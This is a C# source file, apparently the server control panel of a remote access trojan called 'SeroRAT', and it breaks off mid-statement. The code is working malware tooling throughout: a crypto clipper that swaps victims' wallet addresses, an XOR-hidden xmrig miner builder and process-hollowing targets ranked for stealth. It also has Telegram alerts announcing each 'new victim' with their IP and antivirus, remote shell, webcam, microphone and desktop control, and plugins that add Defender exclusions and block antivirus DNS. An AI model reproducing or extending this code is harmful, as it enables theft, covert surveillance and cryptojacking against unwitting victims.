using System.Collections.ObjectModel;
using System.IO;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Effects;
using System.Windows.Threading;
using SeroServer.Data;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class ServerWindow : Window
{
    private readonly DataStore _store = new();
    private TlsServer? _server;
    private DateTime _serverStartedAt;
    private readonly DispatcherTimer _dashTimer;
    private readonly DispatcherTimer _uptimeTimer;
    private readonly System.Collections.ObjectModel.ObservableCollection<Data.AutoTaskEntry> _autoTasks = new();
    private Net.SeroDiscordRPC? _discordRpc;
    // BulkObservableCollection: fires one Reset instead of N individual change events.
    // Prevents DataGrid from refreshing N×N times when thousands of clients connect.
    private sealed class BulkObservableCollection<T> : System.Collections.ObjectModel.ObservableCollection<T>
    {
        private bool _bulk;
        public void AddRange(IEnumerable<T> items)
        {
            _bulk = true;
            foreach (var item in items) Items.Add(item);
            _bulk = false;
            OnCollectionChanged(new System.Collections.Specialized.NotifyCollectionChangedEventArgs(System.Collections.Specialized.NotifyCollectionChangedAction.Reset));
        }
        public void RemoveRange(IEnumerable<T> items)
        {
            _bulk = true;
            foreach (var item in items) Items.Remove(item);
            _bulk = false;
            OnCollectionChanged(new System.Collections.Specialized.NotifyCollectionChangedEventArgs(System.Collections.Specialized.NotifyCollectionChangedAction.Reset));
        }
        protected override void OnCollectionChanged(System.Collections.Specialized.NotifyCollectionChangedEventArgs e)
        { if (!_bulk) base.OnCollectionChanged(e); }
    }

    private readonly BulkObservableCollection<ConnectedClient> _onlineClients = new();
    // O(1) lookup by ID — mirrors _onlineClients, kept in sync by FlushClientQueue
    private readonly Dictionary<string, ConnectedClient> _onlineById = new();
    // Pending connect/disconnect ops, flushed every 150ms on the UI thread
    private readonly System.Collections.Concurrent.ConcurrentQueue<(bool add, ConnectedClient client)> _clientQueue = new();
    private DispatcherTimer? _batchTimer;

    private volatile bool _clientsDirty = true;
    private int _logLineCount;
    private const int LogMaxLines = 2000;
    private const int LogTrimTo   = 1000;
    private readonly Dictionary<TextBlock, DispatcherTimer> _counterTimers = new();
    private readonly Dictionary<string, Window> _featureWindows = new();
    private byte[]? _bldXmrigBytes;
    private string? _bldXmrigPath;
    private byte[]? _bldXorKey;    // per-build random XOR key; encrypts embedded xmrig

    private static byte[] XorBytes(byte[] data, byte[] key)
    {
        var result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            result[i] = (byte)(data[i] ^ key[i % key.Length]);
        return result;
    }

    private static string ConfigFilePath
    {
        get
        {
            var dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SeroServer");
            Directory.CreateDirectory(dir);
            return Path.Combine(dir, "server_config.json");
        }
    }

    public ServerWindow()
    {
        InitializeComponent();

        _dashTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(5) };
        _dashTimer.Tick += (_, _) => RefreshDashboard();

        _uptimeTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(1) };
        _uptimeTimer.Tick += (_, _) => RefreshUptime();

        // Batch client connect/disconnect UI updates every 150ms
        // This prevents the DataGrid from freezing when thousands of clients connect simultaneously
        _batchTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(150) };
        _batchTimer.Tick += FlushClientQueue;
        _batchTimer.Start();

        Loaded += (_, _) =>
        {
            // Wrap in CollectionView so we can filter without modifying _onlineClients
            var view = System.Windows.Data.CollectionViewSource.GetDefaultView(_onlineClients);
            view.Filter = ClientFilter;
            GridClients.ItemsSource = view;
            Log("[*] Server ready. Click START to listen.");
            RefreshAllClients();
            LoadConfig();
            // Initialize default host if empty
            if (BldHosts.Items.Count == 0)
                BldHosts.Items.Add("127.0.0.1");
            GridAutoTasks.ItemsSource = _autoTasks;
            InitHollowTargets();

            // First launch: cert + auth key setup
            bool needsCert;
            try
            {
                var certDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SeroServer");
                needsCert = !File.Exists(Path.Combine(certDir, "server.pfx"));
            }
            catch { needsCert = true; }

            if (needsCert)
                ShowCertSetupDialog();

            // Re-check AFTER dialog — importing a .sero may have restored the auth key
            if (string.IsNullOrEmpty(BldAuthKey.Text.Trim()))
            {
                var bytes = System.Security.Cryptography.RandomNumberGenerator.GetBytes(24);
                BldAuthKey.Text = Convert.ToBase64String(bytes);
                SaveConfig();
                Log("[+] Auth key generated and saved.");
            }

            // Always load cert hash
            try { BldCertHash.Text = Net.CertificateHelper.GetCertSha256Hash(); }
            catch { BldCertHash.Text = "(start server first)"; }
        };
    }

    private string GetHollowTarget()
    {
        var text = BldHollowTarget.Text?.Trim() ?? "";
        // If it's a raw process name, return as-is
        if (text.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
            return text;
        // Extract first word (process name) from display string
        return text.Split(' ', StringSplitOptions.RemoveEmptyEntries).FirstOrDefault() ?? "svchost.exe";
    }

    private void InitHollowTargets()
    {
        var targets = new (string proc, int score, string note)[]
        {
            ("svchost.exe", 95, "many instances, blends in"),
            ("RuntimeBroker.exe", 90, "runs often, lightweight"),
            ("dllhost.exe", 90, "COM surrogate, common"),
            ("conhost.exe", 85, "console host, normal"),
            ("sihost.exe", 85, "shell infrastructure"),
            ("taskhostw.exe", 85, "task host, expected"),
            ("audiodg.exe", 85, "audio device graph"),
            ("SearchProtocolHost.exe", 80, "Windows Search"),
            ("backgroundTaskHost.exe", 80, "UWP background"),
            ("smartscreen.exe", 80, "Defender, may restart"),
            ("spoolsv.exe", 80, "print spooler service"),
            ("WmiPrvSE.exe", 75, "WMI provider, admin"),
            ("wlanext.exe", 75, "WiFi extensibility"),
            ("dwm.exe", 70, "desktop window manager, risky"),
            ("explorer.exe", 70, "shell, crash = desktop gone"),
            ("notepad.exe", 70, "suspicious if visible"),
            ("msiexec.exe", 60, "installer, short-lived"),
            ("cmd.exe", 55, "suspicious if persistent"),
            ("powershell.exe", 50, "flagged by most AV"),
        };

        BldHollowTarget.Items.Clear();
        foreach (var (proc, score, note) in targets)
        {
            var brush = score >= 85
                ? new SolidColorBrush(Color.FromRgb(0x1b, 0x8a, 0x2e))
                : score >= 70
                    ? new SolidColorBrush(Color.FromRgb(0xb8, 0x86, 0x0b))
                    : new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
            BldHollowTarget.Items.Add(new HollowTargetItem { Proc = proc, Score = $"{score}%", Note = note, ScoreColor = brush });
        }

        BldHollowTarget.SelectionChanged += (_, _) =>
        {
            if (BldHollowTarget.SelectedItem is HollowTargetItem item)
                Dispatcher.BeginInvoke(() => BldHollowTarget.Text = item.Proc);
        };
    }

    public class HollowTargetItem
    {
        public string Proc  { get; set; } = "";
        public override string ToString() => Proc;
        public string Score { get; set; } = "";
        public string Note { get; set; } = "";
        public System.Windows.Media.Brush ScoreColor { get; set; } = System.Windows.Media.Brushes.Black;
    }

    // ── Crypto Clipper (global — applies to all clients) ────────────────────────
    private bool _clipperRunning;
    private int  _clipperCount;

    private ClipperSetConfigData BuildClipperConfig(bool enabled) => new()
    {
        Enabled = enabled,
        Addresses = new ClipperAddresses
        {
            BTC  = ClipperBTC.Text.Trim(),
            ETH  = ClipperETH.Text.Trim(),
            LTC  = ClipperLTC.Text.Trim(),
            TRX  = ClipperTRX.Text.Trim(),
            SOL  = ClipperSOL.Text.Trim(),
            XMR  = ClipperXMR.Text.Trim(),
            XRP  = ClipperXRP.Text.Trim(),
            DASH = ClipperDASH.Text.Trim(),
            BCH  = ClipperBCH.Text.Trim(),
        }
    };

    private async void ClipperStart_Click(object sender, RoutedEventArgs e)
    {
        _clipperRunning = true;
        BtnClipperStart.IsEnabled = false; BtnClipperStart.Opacity = 0.45;
        BtnClipperStop.IsEnabled  = true;  BtnClipperStop.Opacity  = 1.0;
        ClipperActiveBadge.Visibility = Visibility.Visible;
        // Push config to all currently online clients
        if (_server != null)
        {
            var pkt = new Packet
            {
                Type = PacketType.ClipperSetConfig,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(BuildClipperConfig(true))
            };
            await _server.SendToAll(pkt);
            Log($"[CLIPPER] Started — config pushed to {_server.ConnectedClients.Count} client(s).");
        }
        SaveConfig();
    }

    private async void ClipperStop_Click(object sender, RoutedEventArgs e)
    {
        _clipperRunning = false;
        BtnClipperStart.IsEnabled = true;  BtnClipperStart.Opacity = 1.0;
        BtnClipperStop.IsEnabled  = false; BtnClipperStop.Opacity  = 0.45;
        ClipperActiveBadge.Visibility = Visibility.Collapsed;
        if (_server != null)
        {
            var pkt = new Packet
            {
                Type = PacketType.ClipperSetConfig,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(BuildClipperConfig(false))
            };
            await _server.SendToAll(pkt);
            Log("[CLIPPER] Stopped — all clients notified.");
        }
    }

    private void ClipperEnabled_Changed(object sender, RoutedEventArgs e) { }

    private void ClipperApply_Click(object sender, RoutedEventArgs e) { }

    private void ClipperClearLog_Click(object sender, RoutedEventArgs e)
    {
        ClipperLog.Clear();
        _clipperCount = 0;
        ClipperCountTxt.Text = "  —  0 replacements";
    }

    private void HandleClipperDetected(string clientId, Protocol.ClipperDetectedData data)
    {
        _clipperCount++;
        var display = clientId.Length > 8 ? clientId[..8] : clientId;
        var line = $"[{DateTime.Now:HH:mm:ss}]  [{display}]  {data.Type}  {data.Original}  →  {data.Replaced}\n";
        ClipperLog.AppendText(line);
        ClipperLogScroll.ScrollToEnd();
        ClipperCountTxt.Text = $"  —  {_clipperCount} replacement{(_clipperCount != 1 ? "s" : "")}";
        Log($"[CLIPPER] {data.Type} replaced on {display}");
    }

    // ── Server-side Telegram notification (global counter) ──────────────────────
    // Fires when a brand-new HWID connects — uses the server's DataStore count
    // so the number is truly global across all victims, not per-machine.
    private async Task ServerTelegramNotifyAsync(Data.ConnectedClient c)
    {
        try
        {
            var token   = BldTelegramToken.Text.Trim();
            var chatId1 = BldTelegramChatId1.Text.Trim();
            var chatId2 = BldTelegramChatId2.Text.Trim();
            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId1)) return;

            // Global count = total unique HWIDs the server has ever seen
            int count = _store.AllClients.Count;

            var prefix  = !string.IsNullOrEmpty(c.Payload) ? c.Payload : c.MachineName;
            var admin   = c.IsAdmin ? "Yes" : "No";
            var country = string.IsNullOrEmpty(c.Country) ? "N/A" : c.Country;
            var parisTz = TimeZoneInfo.FindSystemTimeZoneById("Romance Standard Time");
            var paris   = TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow, parisTz)
                              .ToString("yyyy-MM-dd HH:mm") + " (Paris)";

            var msg =
                $"New victim #{count} - SeroRAT\n\n" +
                $"ID: {c.Id}\n" +
                $"User: {c.Username}@{c.MachineName}\n" +
                $"Local IP: {c.IP}\n" +
                $"Public IP: {c.IP}\n" +
                $"Country: {country}\n" +
                $"OS: {c.OS}\n" +
                $"Admin: {admin}\n" +
                $"AV: {c.Antivirus}\n" +
                $"Payload: {prefix}\n" +
                $"Time: {paris}";

            using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(10) };
            var targets = new List<string> { chatId1 };
            if (!string.IsNullOrEmpty(chatId2)) targets.Add(chatId2);

            foreach (var id in targets)
            {
                try
                {
                    var url = $"https://api.telegram.org/bot{token}/sendMessage" +
                              $"?chat_id={Uri.EscapeDataString(id)}" +
                              $"&text={Uri.EscapeDataString(msg)}";
                    await http.GetAsync(url);
                }
                catch { }
            }
        }
        catch { }
    }

    // ── Server Control ──────────────────────────────

    private void StartStop_Click(object sender, RoutedEventArgs e)
    {
        if (_server is { IsRunning: true })
        {
            _server.Stop();
            _dashTimer.Stop();
            _uptimeTimer.Stop();
            _discordRpc?.Stop();
            _discordRpc = null;
            TxtPort.IsEnabled = true;
            SetServerStatus(false);
            BtnStartStop.Content = "START";
            BtnStartStop.Style = (Style)FindResource("SGreenBtn");
            _server = null;
            while (_clientQueue.TryDequeue(out _)) { }  // drain pending ops
            _onlineClients.Clear();
            _onlineById.Clear();
            UpdateClientCount();
            TxtStatusLeft.Text = "SɆⱤØ RAT";
            TxtStatusLeft.Foreground = new SolidColorBrush(Color.FromRgb(0x2E, 0x30, 0x48));
            Log("[*] Server stopped.");
        }
        else
        {
            if (!int.TryParse(TxtPort.Text, out int port) || port < 1 || port > 65535)
            {
                Log("[!] Invalid port.");
                return;
            }

            SaveConfig();

            try
            {
                _server = new TlsServer(_store);
                _server.OnLog += msg => Dispatcher.Invoke(() => Log(msg));
                _server.ClientConnected += c =>
                {
                    // UI update is batched — enqueue and let _batchTimer flush at 150ms intervals
                    _clientQueue.Enqueue((true, c));

                    // Side effects: run on thread pool, read UI state via Dispatcher.Invoke
                    _ = Task.Run(async () =>
                    {
                        bool isNewHwid = !_store.AllClients.TryGetValue(c.Hwid, out var rec)
                                         || rec.ActivityLog.Count <= 1;

                        if (_autoTasks.Count > 0)
                            await ExecuteAutoTasksForClient(c);

                        bool telegramEnabled = Dispatcher.Invoke(() => BldTelegramEnabled.IsChecked == true);
                        if (isNewHwid && telegramEnabled)
                            _ = ServerTelegramNotifyAsync(c);

                        if (_clipperRunning && _server != null)
                            await _server.SendToClient(c.Id, new Packet
                            {
                                Type = PacketType.ClipperSetConfig,
                                Data = Newtonsoft.Json.JsonConvert.SerializeObject(
                                    Dispatcher.Invoke(() => BuildClipperConfig(true)))
                            });
                    });
                };
                _server.ClientDisconnected += c =>
                {
                    // UI update batched — feature window closing handled in FlushClientQueue
                    _clientQueue.Enqueue((false, c));
                };
                _server.ElevationResultReceived += (clientId, data) => Dispatcher.Invoke(() =>
                {
                    var status = data.Success ? "ELEVATED" : "FAILED";
                    Log($"[UAC] Client {clientId}: {status} - {data.Message}");
                    if (data.Success) RefreshClients();
                });

                // Crypto Clipper detections → global Clipper tab log
                _server.ClipperDetectedReceived += (clientId, data) =>
                    Dispatcher.BeginInvoke(() => HandleClipperDetected(clientId, data));

                // Log autotask shell output separately (not routed to RemoteShellWindow)
                _server.AutoTaskShellOutputReceived += (clientId, output) => Dispatcher.BeginInvoke(() =>
                {
                    if (string.IsNullOrWhiteSpace(output)) return;
                    var display = clientId.Length > 8 ? clientId[..8] : clientId;
                    foreach (var line in output.Split('\n', StringSplitOptions.RemoveEmptyEntries))
                        Log($"[AT:{display}] {line.TrimEnd('\r')}");
                });

                // Set auth key, client ID prefix, and max clients
                var authKey = BldAuthKey.Text.Trim();
                if (string.IsNullOrEmpty(authKey))
                {
                    Log("[!] Auth key is required. Generate one in the Builder tab first.");
                    return;
                }
                _server.AuthKey = authKey;
                _server.GetClientIdPrefix = () => Dispatcher.Invoke(() => BldClientIdPrefix.Text.Trim());
                if (int.TryParse(SettingsMaxClients.Text, out int maxClients) && maxClients > 0)
                    _server.MaxConnectedClients = maxClients;
                _server.Start(port);
                _serverStartedAt = DateTime.UtcNow;
                TxtPort.IsEnabled = false;
                SetServerStatus(true);
                BtnStartStop.Content = "STOP";
                BtnStartStop.Style = (Style)FindResource("SRedBtn");
                _dashTimer.Start();
                _uptimeTimer.Start();
                TxtStatusLeft.Text = $"● Listening on :{port}";
                TxtStatusLeft.Foreground = (Brush)FindResource("GreenBrush");

                // Discord RPC
                if (SettingsDiscordRPC.IsChecked == true)
                {
                    try
                    {
                        _discordRpc = new Net.SeroDiscordRPC();
                        _discordRpc.Start(() => _server?.ConnectedClients.Count ?? 0);
                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                Log($"[!] Failed to start: {ex.Message}");
            }
        }
    }

    private void SetServerStatus(bool running)
    {
        var brush = running
            ? (Brush)FindResource("GreenBrush")
            : (Brush)FindResource("RedBrush");

        ServerDot.Fill = brush;
        TxtServerStatus.Text = running ? "Running" : "Stopped";
    }

    private void UpdateClientCount()
    {
        var count = _server?.ConnectedClients.Count ?? 0;
        TxtClientCount.Text = $"  |  {count} client{(count != 1 ? "s" : "")}";
    }

    // Flush queued connect/disconnect operations in a single batch → one CollectionChanged (Reset)
    private void FlushClientQueue(object? s, EventArgs e)
    {
        if (_clientQueue.IsEmpty) return;

        var toAdd    = new List<ConnectedClient>();
        var toRemove = new List<ConnectedClient>();
        var toClose  = new List<string>();  // client IDs whose feature windows must close

        while (_clientQueue.TryDequeue(out var op))
        {
            if (op.add)
            {
                if (!_onlineById.ContainsKey(op.client.Id))
                    toAdd.Add(op.client);
            }
            else
            {
                if (_onlineById.ContainsKey(op.client.Id))
                    toRemove.Add(op.client);
                toClose.Add(op.client.Id);
            }
        }

        if (toRemove.Count > 0)
        {
            foreach (var c in toRemove) _onlineById.Remove(c.Id);
            _onlineClients.RemoveRange(toRemove);
        }
        if (toAdd.Count > 0)
        {
            foreach (var c in toAdd) _onlineById[c.Id] = c;
            _onlineClients.AddRange(toAdd);
        }

        // Close feature windows for disconnected clients
        foreach (var id in toClose)
        {
            var prefix = id + ":";
            var keys   = _featureWindows.Keys.Where(k => k.StartsWith(prefix, StringComparison.Ordinal)).ToList();
            foreach (var k in keys)
            {
                try { _featureWindows[k].Close(); } catch { }
            }
        }

        if (toAdd.Count > 0 || toRemove.Count > 0)
        {
            _clientsDirty = true;
            UpdateClientCount();
        }
    }

    private void RefreshClients()
    {
        if (_server == null) return;
        // O(n) sync using the dictionary — safe for 100k clients
        var current = _server.ConnectedClients;

        // Remove stale (O(n))
        var toRemove = _onlineClients.Where(c => !current.ContainsKey(c.Id)).ToList();
        if (toRemove.Count > 0)
        {
            foreach (var c in toRemove) _onlineById.Remove(c.Id);
            _onlineClients.RemoveRange(toRemove);
        }

        // Add missing (O(n))
        var toAdd = current.Values.Where(c => !_onlineById.ContainsKey(c.Id)).ToList();
        if (toAdd.Count > 0)
        {
            foreach (var c in toAdd) _onlineById[c.Id] = c;
            _onlineClients.AddRange(toAdd);
        }
    }

    private void RefreshAllClients()
    {
        int currentPort = _server?.Port ?? 0;
        var clients = _store.AllClients.Values
            .Where(r => currentPort == 0 || r.LastPort == 0 || r.LastPort == currentPort)
            .OrderByDescending(r => r.LastSeen);
        GridAllClients.ItemsSource = null;
        GridAllClients.ItemsSource = new ObservableCollection<ClientRecord>(clients);
    }

    private void RefreshUptime()
    {
        var uptime = DateTime.UtcNow - _serverStartedAt;
        DashUptime.Text = uptime.TotalHours >= 1
            ? $"{(int)uptime.TotalHours}h {uptime.Minutes}m {uptime.Seconds:D2}s"
            : $"{uptime.Minutes}m {uptime.Seconds:D2}s";
    }

    private void AnimateCounter(TextBlock tb, int to)
    {
        if (!int.TryParse(tb.Text, out int from) || from == to) { tb.Text = to.ToString(); return; }

        // Stop any previous animation on this TextBlock before starting a new one,
        // otherwise multiple timers pile up and fight over the same Text property.
        if (_counterTimers.TryGetValue(tb, out var prev)) { prev.Stop(); _counterTimers.Remove(tb); }

        int steps = 8, step = 0;
        double delta = (to - from) / (double)steps;
        var t = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(30) };
        _counterTimers[tb] = t;
        t.Tick += (_, _) =>
        {
            if (++step >= steps) { tb.Text = to.ToString(); t.Stop(); _counterTimers.Remove(tb); }
            else tb.Text = ((int)(from + delta * step)).ToString();
        };
        t.Start();
    }

    private void RefreshDashboard()
    {
        var online = _server?.ConnectedClients.Count ?? 0;
        var total = _store.AllClients.Count;

        AnimateCounter(DashOnline, online);
        AnimateCounter(DashTotal, total);

        UpdateClientCount();

        // Only rebuild grids when something changed (add/remove/tag)
        if (_clientsDirty)
        {
            _clientsDirty = false;
            RefreshClients();
            RefreshAllClients();
        }
    }

    // ── Client Actions ──────────────────────────────

    private List<ConnectedClient> GetSelectedClients()
    {
        return GridClients.SelectedItems.Cast<ConnectedClient>().ToList();
    }

    private async void DisconnectClient_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (_server == null) return;
        foreach (var client in clients)
        {
            // Send Disconnect packet so stub sets ShouldReconnect=false before stream closes
            try { await _server.SendToClient(client.Id, new Packet { Type = PacketType.Disconnect }); } catch { }
            await Task.Delay(150);
            _server.DisconnectClient(client.Id);
        }
    }

    private void GridClients_PreviewKeyDown(object sender, System.Windows.Input.KeyEventArgs e)
    {
        if (e.Key == System.Windows.Input.Key.A && System.Windows.Input.Keyboard.Modifiers == System.Windows.Input.ModifierKeys.Control)
        {
            GridClients.SelectAll();
            e.Handled = true;
        }
    }

    private void OpenFeatureWindow<T>(string clientId, Func<T> factory) where T : Window
    {
        string key = $"{clientId}:{typeof(T).Name}";
        if (_featureWindows.TryGetValue(key, out var existing))
        {
            if (existing.WindowState == WindowState.Minimized)
                existing.WindowState = WindowState.Normal;
            existing.Activate();
            return;
        }
        var win = factory();
        _featureWindows[key] = win;
        win.Closed += (_, _) => _featureWindows.Remove(key);
        win.Show();
    }

    private void RemoteShell_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        var server = _server;
        var newClients = new List<ConnectedClient>();
        foreach (var c in clients)
        {
            string key = $"{c.Id}:RemoteShellWindow";
            if (_featureWindows.TryGetValue(key, out var existing))
            {
                if (existing.WindowState == WindowState.Minimized)
                    existing.WindowState = WindowState.Normal;
                existing.Activate();
            }
            else newClients.Add(c);
        }
        if (newClients.Count == 0) return;
        var win = new RemoteShellWindow(server, newClients);
        var keys = newClients.Select(c => $"{c.Id}:RemoteShellWindow").ToList();
        foreach (var k in keys) _featureWindows[k] = win;
        win.Closed += (_, _) => { foreach (var k in keys) _featureWindows.Remove(k); };
        win.Show();
        Log($"[*] Remote shell opened for {newClients.Count} client(s).");
    }

    private async void RemoteDesktop_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        var server = _server;
        var area = SystemParameters.WorkArea;
        const int step = 28, margin = 40, winW = 900, winH = 560;
        int maxSteps = Math.Max(1, (int)(Math.Min(area.Width - winW - margin, area.Height - winH - margin) / step));
        int i = 0;
        foreach (var c in clients)
        {
            int s = (i % maxSteps) * step;
            OpenFeatureWindow<RemoteDesktopWindow>(c.Id, () =>
            {
                var w = new RemoteDesktopWindow(server, c.Id);
                w.Left = area.Left + margin + s;
                w.Top  = area.Top  + margin + s;
                return w;
            });
            i++;
            if (clients.Count > 1) await Task.Delay(80);
        }
        Log($"[*] Remote desktop opened for {clients.Count} client(s).");
    }

    private async void RemoteWebcam_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        var server = _server;
        var area = SystemParameters.WorkArea;
        const int step = 28, margin = 60, winW = 700, winH = 520;
        int maxSteps = Math.Max(1, (int)(Math.Min(area.Width - winW - margin, area.Height - winH - margin) / step));
        int i = 0;
        foreach (var c in clients)
        {
            int s = (i % maxSteps) * step;
            OpenFeatureWindow<WebcamWindow>(c.Id, () =>
            {
                var w = new WebcamWindow(server, c.Id);
                w.Left = area.Left + margin + s;
                w.Top  = area.Top  + margin + s;
                return w;
            });
            i++;
            if (clients.Count > 1) await Task.Delay(80);
        }
        Log($"[*] Remote webcam opened for {clients.Count} client(s).");
    }

    private async void TcpManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<TcpManagerWindow>(c.Id, () => new TcpManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void StartupManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<StartupManagerWindow>(c.Id, () => new StartupManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void FileManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<FileManagerWindow>(c.Id, () => new FileManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void Microphone_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<MicrophoneWindow>(c.Id, () => new MicrophoneWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void Fun_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<FunWindow>(c.Id, () => new FunWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void ProcessManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<ProcessManagerWindow>(c.Id, () => new ProcessManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
        Log($"[*] Process Manager opened for {clients.Count} client(s).");
    }

    private async void Socks5_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<Socks5Window>(c.Id, () => new Socks5Window(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    // ── New feature window handlers ──────────────────────────────────────────

    private async void ServiceManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<ServiceManagerWindow>(c.Id, () => new ServiceManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
        Log($"[*] Service Manager opened for {clients.Count} client(s).");
    }

    private async void WindowManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<WindowManagerWindow>(c.Id, () => new WindowManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
        Log($"[*] Window Manager opened for {clients.Count} client(s).");
    }

    private async void RegistryEditor_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            if (!c.IsAdmin)
            {
                var r = MessageBox.Show(
                    $"Client {c.Id} is NOT running as administrator.\n\nThe Registry Editor requires admin privileges to write/delete keys.\nReading HKCU keys will still work.\n\nOpen anyway?",
                    "Admin Recommended", MessageBoxButton.YesNo, MessageBoxImage.Warning);
                if (r != MessageBoxResult.Yes) continue;
            }
            OpenFeatureWindow<RegistryEditorWindow>(c.Id, () => new RegistryEditorWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
        Log($"[*] Registry Editor opened for {clients.Count} client(s).");
    }

    private async void InstalledApps_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<InstalledAppsWindow>(c.Id, () => new InstalledAppsWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
        Log($"[*] Installed Apps opened for {clients.Count} client(s).");
    }

    private async void DeviceManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<DeviceManagerWindow>(c.Id, () => new DeviceManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
        Log($"[*] Device Manager opened for {clients.Count} client(s).");
    }

    private async void PerformanceMonitor_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<PerformanceMonitorWindow>(c.Id, () => new PerformanceMonitorWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
        Log($"[*] Performance Monitor opened for {clients.Count} client(s).");
    }

    // ── Miscellaneous quick-send to selected clients ────────────────────────
    #pragma warning disable CS4014
    private void QuickExcludeCDrive_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        _ = Task.Run(async () =>
        {
            // Compile (or use cache) then send to selected clients only
            var cachePath = PluginCachePath("Exclude C:\\");
            if (!System.IO.File.Exists(cachePath))
            {
                AutoTask_ExcludeCDrive_Click(sender, e);
                return;
            }
            var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
            var pkt = new Protocol.Packet
            {
                Type = Protocol.PacketType.PluginExec,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
                { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
            };
            foreach (var c in clients) await _server.SendToClient(c.Id, pkt);
            Dispatcher.BeginInvoke(() => Log($"[+] Exclude C:\\ sent to {clients.Count} client(s)."));
        });
    }

    private void QuickBlockAvDns_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        _ = Task.Run(async () =>
        {
            var cachePath = PluginCachePath("Block AV DNS");
            if (!System.IO.File.Exists(cachePath))
            {
                AutoTask_BlockAvDomains_Click(sender, e);
                return;
            }
            var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
            var pkt = new Protocol.Packet
            {
                Type = Protocol.PacketType.PluginExec,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
